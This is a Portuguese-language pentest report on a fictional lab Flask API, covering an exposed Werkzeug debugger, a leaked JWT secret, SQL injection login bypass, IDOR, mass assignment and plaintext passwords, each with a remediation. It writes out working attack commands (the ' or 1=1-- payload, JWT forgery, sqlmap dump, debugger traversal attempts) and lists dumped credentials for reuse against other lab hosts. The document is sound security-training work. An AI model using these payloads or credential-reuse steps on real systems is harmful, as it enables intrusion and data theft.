# Corp API — Pentest Report

**Alvo:** Corp API (10.10.0.40:5000 / localhost:5000)
**Data de inicio:** 2026-10-08
**Testador:** Daniel Reis

---

## DESCOBERTA-001: Werkzeug Debug Console Exposto

**Severidade:** Critico
**CWE:** CWE-489 (Active Debug Code), CWE-94 (Code Injection)
**CVE:** N/A (configuracao/falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** http://localhost:5000/console

**Descricao:**
A aplicacao Flask rodando com o debugger Werkzeug ativo em producao.
O console interativo esta acessivel sem autenticacao e o SECRET do debugger
esta exposto no codigo-fonte da pagina.

**Evidencia:**
```
$ curl -i http://localhost:5000/
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.9 Python/3.11.17

$ curl -i http://localhost:5000/console
HTTP 200 OK
EVALEX = true, SECRET = "6Jmw2903rBZC9tG9TRuc"
Console interativo Python acessivel (protegido apenas por PIN).
```

**Impacto:**
Execucao remota de codigo (RCE) no servidor. Um atacante que obtenha o PIN
pode executar comandos Python arbitrarios no contexto da aplicacao.

**Recomendacao:**
Desativar o modo debug em producao (`debug=False` no Flask).

---

## DESCOBERTA-002: Information Disclosure via Debug Endpoint

**Severidade:** Critico
**CWE:** CWE-215 (Insertion of Sensitive Information Into Debugging Code), CWE-200 (Information Exposure), CWE-798 (Use of Hard-coded Credentials)
**CVE:** N/A (configuracao/falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** http://localhost:5000/api/v1/debug

**Descricao:**
Endpoint debug acessivel sem autenticacao deixa esposta  informacoes sensiveis
da aplicacao incluindo secret key, variaveis de ambiente, caminho do banco
de dados e hostname interno.

**Evidencia:**
```
$ curl -s http://localhost:5000/api/v1/debug
{
  "db_path": "/app/corp.db",
  "secret_key": "techcorp-secret-2024",
  "env": {
    "HOME": "/root",
    "HOSTNAME": "srv-api01",
    ...
  },
  "version": "1.2.3-dev"
}
```

**Dados vazados:**
- JWT secret key: `techcorp-secret-2024` (permite forjar tokens de qualquer usuario)
- Banco de dados: SQLite em `/app/corp.db`
- App rodando como `root`
- Hostname interno: `srv-api01`
- Dominio: `srv-api01.techcorp.local` (via /api/v1/health)

**Impacto:**
Com a secret key um atacante pode forjar tokens JWT com qualquer role/user_id,
obtendo acesso total a API sem credenciais. Informacoes internas facilitam
ataques subsequentes.

**Recomendacao:**
Remover ou proteger o endpoint `/api/v1/debug`. Nunca expor secret keys
ou variaveis de ambiente em producao.

---

## DESCOBERTA-003: SQL Injection no Login (Authentication Bypass)

**Severidade:** Critico
**CWE:** CWE-89 (SQL Injection), CWE-287 (Improper Authentication)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** POST http://localhost:5000/api/v1/login

**Descricao:**
O campo `username` do endpoint de login e vulneravel a SQL Injection,
permitindo bypass completo da autenticacao.

**Evidencia:**
```
$ curl -s -X POST http://localhost:5000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"' or 1=1--","password":"x"}'

{
  "message": "Welcome admin",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.8xBjl3K5ByZAT-5Iu0Wc1Nx-XpS97LJEpYqJNFmBjtU"
}
```

**Payload:** `' or 1=1--`
**Resultado:** Token JWT de admin (user_id:1, role:admin) sem conhecer credenciais.

**Impacto:**
Acesso administrativo total a API. Combinado com a secret key da DESCOBERTA-002,
um atacante pode forjar tokens para qualquer usuario e escalar privilegios.

**Recomendacao:**
Usar consultas parametrizadas (prepared statements) em vez de concatenacao
de strings SQL. Implementar rate limiting no endpoint de login.

---

## DESCOBERTA: IDOR — Acesso a Dados de Outros Usuarios

**Severidade:** Alto
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284 (Improper Access Control)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** GET http://localhost:5000/api/v1/users/<id>

**Descricao:**
A API nao valida se o usuario autenticado tem permissao para acessar
o perfil de outros usuarios. Qualquer usuario autenticado pode consultar
dados de qualquer outro usuario alterando o ID na URL.

**Evidencia:**
```
$ python3 -c "import jwt; print(jwt.encode({'user_id':2,'role':'user'}, 'techcorp-secret-2024', algorithm='HS256'))"
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJyb2xlIjoidXNlciJ9...

$ curl -s http://localhost:5000/api/v1/users/1 -H "Authorization: Bearer <token_user2>"
{
  "email": "admin@techcorp.local",
  "id": 1,
  "role": "admin",
  "salary": 25000.0,
  "username": "admin"
}
```

**Dados expostos via enumeracao (user_id 1-4):**
| ID | Username | Email | Role | Salario |
|----|----------|-------|------|---------|
| 1 | admin | admin@techcorp.local | admin | 25000.0 |
| 2 | jsilva | jsilva@techcorp.local | developer | 8500.0 |
| 3 | mrodrigues | mrodrigues@techcorp.local | manager | 12000.0 |
| 4 | ceo | ceo@techcorp.local | executive | 50000.0 |

**Impacto:**
Vazamento de dados pessoais (email, salario) de todos os usuarios.
Um atacante pode enumerar todos os IDs e extrair o cadastro completo.

**Recomendacao:**
Validar que o user_id do token JWT corresponde ao ID solicitado,
ou restringir acesso por role (ex: so admin pode listar outros usuarios).

---

## DESCOBERTA-005: Mass Assignment — Escalacao de Privilegios

**Severidade:** Critico
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-269 (Improper Privilege Management)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** PUT http://localhost:5000/api/v1/users/<id>

**Descricao:**
O endpoint de atualizacao de usuario aceita o campo `role` no body
sem validacao, permitindo que qualquer usuario altere seu proprio role
(ou de outro usuario) para admin.

**Evidencia:**
```
$ curl -s -X PUT http://localhost:5000/api/v1/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

{
  "message": "Updated"
}
```
Resultado: usuario jsilva (id:2) teve role alterado de `developer` para `admin`.

**Impacto:**
Escalacao de privilegios. Qualquer usuario autenticado pode se tornar admin,
obtendo controle total da aplicacao.

**Recomendacao:**
Nunca aceitar campos de autorizacao (role, is_admin, permissions) em input
do usuario. Usar allowlist de campos editaveis no backend.

---

## DESCOBERTA-006: Senhas Armazenadas em Plaintext

**Severidade:** Critico
**CWE:** CWE-256 (Plaintext Storage of a Password), CWE-312 (Cleartext Storage of Sensitive Information)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** Banco de dados SQLite (/app/corp.db) — tabela `users`

**Descricao:**
As senhas dos usuarios estao armazenadas em texto puro no banco de dados,
sem qualquer tipo de hashing ou criptografia. Combinado com a SQLi do
FINDING-003, um atacante extrai todas as credenciais em segundos.

**Evidencia:**
```
$ sqlmap -u "http://localhost:5000/api/v1/login" --method=POST \
  --data='{"username":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  -p username --dbms=sqlite --dump --batch --ignore-code=401

Database: SQLite_masterdb
Table: users
[4 entries]
+-----------+---------+-------------+------------+
| role      | salary  | password    | username   |
+-----------+---------+-------------+------------+
| admin     | 25000.0 | admin123    | admin      |
| admin     | 8500.0  | Welcome1    | jsilva     |
| manager   | 12000.0 | Corp2024!   | mrodrigues |
| executive | 50000.0 | Str0ngP4ss! | ceo        |
+-----------+---------+-------------+------------+
```

**Impacto:**
Comprometimento total de todas as contas. Senhas podem ser reutilizadas
em outros sistemas (email, VPN, AD). A senha do CEO foi exposta.

**Recomendacao:**
Usar hashing com salt (bcrypt, argon2). Nunca armazenar senhas em plaintext.
Forcar rotacao de todas as senhas.

---

## DESCOBERTA-007: Vazamento de Informacao Confidencial via SQLi

**Severidade:** ALto
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-89 (SQL Injection)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** Banco de dados SQLite (/app/corp.db) — tabela `projects`

**Descricao:**
A extracao do banco via SQL Injection mostrou  a tabela `projects` contendo
informacoes confidenciais sobre projetos internos, orcamentos e notas
tecnicas sensiveis.

**Evidencia:**
```
Table: projects
[3 entries]
+----------------+-----------------------------------+----------+--------------+
| name           | notes                             | budget   | status       |
+----------------+-----------------------------------+----------+--------------+
| Project Alpha  | Migration to cloud - Q1 2025      | 150000.0 | active       |
| Internal Audit | Security assessment pending       | 50000.0  | confidential |
| Client Portal  | PHP legacy - known SQLi in search | 80000.0  | active       |
+----------------+-----------------------------------+----------+--------------+
```

**Dados sensiveis expostos:**
- Orcamentos internos de projetos (R$150k, R$80k, R$50k)
- Auditoria de seguranca pendente (status `confidential`)
- Vulnerabilidade SQLi conhecida e nao corrigida no Client Portal (PHP legado)

**Impacto:**
Informacoes estrategicas e financeiras expostas. A nota do Client Portal
revela que a empresa tem conhecimento de uma SQLi nao corrigida em outro
sistema — evidencia de negligencia em seguranca.

**Recomendacao:**
Corrigir a SQLi no login (FINDING-003) que permite acesso ao banco.
Nao armazenar notas tecnicas sobre vulnerabilidades em bancos de dados
acessiveis por aplicacoes web.

---

## DESCOBERTA-008: Stack Trace Disclosure via Integer Overflow

**Severidade:** Medio
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-489 (Active Debug Code)
**CVE:** N/A (falha de aplicacao, nao vulnerabilidade de produto)
**Alvo:** GET http://localhost:5000/api/v1/users/<id>

**Descricao:**
Ao enviar um ID numerico extremamente grande, a aplicacao gera um
OverflowError que expoe o traceback completo do Werkzeug, incluindo
codigo-fonte da aplicacao, caminhos internos e frame IDs do debugger.

**Evidencia:**
```
$ curl -s "http://localhost:5000/api/v1/users/999999999999999999999999999" \
  -H "Authorization: Bearer $TOKEN"

OverflowError: Python int too large to convert to SQLite INTEGER

Traceback revela:
- Codigo-fonte: /app/vuln_api.py linha 63
- Flask path: /usr/local/lib/python3.11/site-packages/flask/app.py
- Query SQL: SELECT id,username,email,role,salary FROM users WHERE id=?
- Frame IDs do debugger (ex: 140146439279744)
```

**Tentativa de RCE via frame eval:**
Tentou-se executar codigo usando frame ID + SECRET nos endpoints:

- /console?__debugger__=yes&cmd=...&frm=FRAME&s=SECRET → 404 (frame expirado)
- /api/v1/users/...?__debugger__=yes&cmd=...&frm=FRAME&s=SECRET → PIN required

Conclusao: Werkzeug 3.1.9 exige PIN para qualquer eval, mesmo com frame valido.
Sem capacidade de leitura de arquivos (MAC, machine-id), calculo do PIN
fica fora de alcance com as vulnerabilidades atuais.

**Confirmacao do bloqueio do PIN:**
Verificado via /api/v1/debug que `WERKZEUG_DEBUG_PIN` NAO esta definido no
env — ou seja, o PIN e calculado dinamicamente no startup a partir de:

- `probably_public_bits` (ja conhecidos): username=root, modname=flask.app,
  appname=Flask, path=/usr/local/lib/python3.11/site-packages/flask/app.py
- `private_bits` (INACESSIVEIS): MAC (/sys/class/net/eth0/address) e
  machine-id (/etc/machine-id ou /proc/sys/kernel/random/boot_id + cgroup)

Sem file read, os private_bits sao inalcancaveis pela superficie
da API. Brute force inviavel (espaco de 10^9 + lockout progressivo do Werkzeug).
A RCE via console permanece BLOQUEADA o PIN e o unico controle efetivo da app.

**Impacto:**
Exposicao de codigo-fonte, estrutura interna e queries SQL da aplicacao.
Facilita desenvolvimento de exploits mais direcionados.

**Recomendacao:**
Desabilitar debug mode. Implementar tratamento de erros que retorne
mensagens genericas (HTTP 400/500) sem stack traces.

---

## Recon Notes

### Banner Grabbing
- **Server:** Werkzeug/3.1.9 Python/3.11.17
- **Framework:** Flask (sem proxy reverso na frente)
- **Connection:** close (sem keep-alive, reforca ausencia de reverse proxy)

### Endpoints descobertos
| Endpoint | Metodo | Status | Notas |
|----------|--------|--------|-------|
| /console | GET | 200 | Werkzeug debugger (FINDING-001) |
| /api/v1/login | POST | 200 | SQLi no username (FINDING-003) |
| /api/v1/debug | GET | 200 | Info disclosure (FINDING-002) |
| /api/v1/health | GET | 200 | Vaza hostname/dominio |
| /api/v1/users/<id> | GET | 200 | IDOR (FINDING-004) |
| /api/v1/users/<id> | PUT | 200 | Mass Assignment (FINDING-005) |

### Checklist
- [x] Directory bruteforce com gobuster
- [x] Enumerar endpoints da API
- [x] Testar SQLi no login
- [x] Explorar /api/v1/users com token admin (IDOR confirmado)
- [x] Forjar JWT com secret key (funciona, IDOR comprovado)
- [x] Testar mass assignment no PUT /users (escalacao confirmada)
- [x] Extrair dados do banco via SQLi (sqlmap — dump completo)
- [x] Testar bypass do PIN do Werkzeug console (bloqueado)
- [x] Forcar stack trace via integer overflow (FINDING-008)
- [x] Verificar WERKZEUG_DEBUG_PIN no env via /debug (PIN dinamico — console bloqueado)
- [~] Testar outros metodos HTTP nos endpoints (DELETE, PATCH) — fora de escopo
- [~] Credential reuse em outros alvos do lab — fora de escopo (engajamento restrito a Corp API)

---

## Analise de Superficie de Ataque

### Cadeia 1: SQLi → Dump do Banco
```
Banner grab → /debug (secret key) → SQLi no login → token admin → sqlmap → dump completo
```
**Limite:** banco SQLite extraido inteiro (tabelas users e projects).
SQLite nao tem funcoes de leitura de arquivos (sem LOAD_FILE como MySQL).
Cadeia esgotada — nao ha mais dados acessiveis por esta via.

### Cadeia 2: JWT Forgery → IDOR + Escalacao
```
Secret key (/debug) → forjar token qualquer user → IDOR em /users/<id> → mass assignment no PUT
```
**Limite:** controle total da API. Todos os dados de usuarios acessiveis,
roles alteraveis. Nao ha mais endpoints alem dos 3 descobertos (/login, /debug, /health)
+ /users/<id> (GET/PUT).

### Cadeia 3: Werkzeug Console → RCE (bloqueada)
```
/console exposto → SECRET no HTML → forcar traceback (integer overflow) → frame ID → tentativa de eval
```
**Limite:** Werkzeug 3.1.9 exige PIN para qualquer execucao de codigo,
inclusive via frame eval. Para calcular o PIN sao necessarios:
- MAC address do container (via /sys/class/net/eth0/address)
- Machine ID (via /etc/machine-id ou /proc/sys/kernel/random/boot_id)

**Tentativas de leitura de arquivos esgotadas:**
- SQLite nao suporta leitura de arquivos do sistema
- Path traversal no resource endpoint do debugger (?cmd=resource&f=../../...) — sem retorno
- /proc/net/arp, /proc/net/if_inet6, /proc/self/cgroup — inacessiveis
- load_extension() no SQLite — bloqueado ("not authorized")

**Conclusao:** RCE via Werkzeug console nao e alcancavel com a superficie
de ataque atual. Confirmado que `WERKZEUG_DEBUG_PIN` nao esta no env (PIN
dinamico), portanto nao ha como obter nem brute-forcar o PIN sem um vetor
de file read (LFI, SSRF) ou acesso direto ao container. Todos os demais
vetores da API foram explorados; esta cadeia esta definitivamente bloqueada.

### Credenciais Extraidas (para reuse em outros alvos)
| Username | Senha | Origem |
|----------|-------|--------|
| admin | admin123 | Corp API - SQLi dump |
| jsilva | Welcome1 | Corp API - SQLi dump |
| mrodrigues | Corp2024! | Corp API - SQLi dump |
| ceo | Str0ngP4ss! | Corp API - SQLi dump |

### Proximos alvos sugeridos
- Target Alpha (10.10.0.10) — testar credential reuse via SSH
- Target Bravo (10.10.0.20) — webshell + SSH
- Servidor Corporativo (10.10.0.30) — FTP anon, SMB, DNS zone transfer, SNMP
- Ambiente Windows (10.10.1.x) — AD (Kerberoasting, AS-REP), MSSQL, File Server

---

## Conclusao do Engajamento

A Corp API apresenta falhas graves e sistemicas de seguranca. das 8 encontradas,
**6 sao criticos** e permitem comprometimento total da aplicacao:

- **Autenticacao quebrada** — SQLi no login (FINDING-003) e secret key exposta
  (FINDING-002) permitem acesso admin sem credenciais e forja de JWT arbitrario.
- **Autorizacao ausente** — IDOR (FINDING-004) e mass assignment (FINDING-005)
  expoem e alteram dados de qualquer usuario, incluindo escalacao para admin.
- **Dados sensiveis desprotegidos** — senhas em plaintext (FINDING-006) e
  dados confidenciais de projetos/salarios acessiveis via dump (FINDING-007).
- **Exposicao de debug** — console Werkzeug e endpoint /debug ativos em
  "producao" (FINDING-001/002/008).

**Unico controle efetivo:** o PIN do console Werkzeug. Apesar do console estar
exposto, o PIN e calculado dinamicamente (nao definido por env) e seus
`private_bits` (MAC + machine-id) sao inalcancaveis sem um primitivo de file
read. Na ausencia de LFI/SSRF e com SQLite incapaz de ler arquivos, a RCE via
console nao foi alcancada — unica cadeia de ataque bloqueada no engajamento.

### Priorizacao de remediacao
1. **Imediato:** desabilitar `debug=True`; remover /console e /api/v1/debug;
   rotacionar a secret key JWT (`techcorp-secret-2024`) e todas as senhas.
2. **Alto:** consultas parametrizadas no login; validacao de autorizacao
   (user_id do token vs. recurso) e allowlist de campos no PUT.
3. **Medio:** hashing de senhas (argon2/bcrypt); tratamento de erro generico
   sem stack trace; rate limiting no login.

---

> **Aviso:** Este relatorio e integralmente ficticio, produzido em ambiente de
> laboratorio controlado para fins de aprendizado e portfolio. Todos os
> alvos, IPs, hostnames (TechCorp, srv-api01), credenciais e dados sao
> simulados e nao correspondem a sistemas ou pessoas reais.
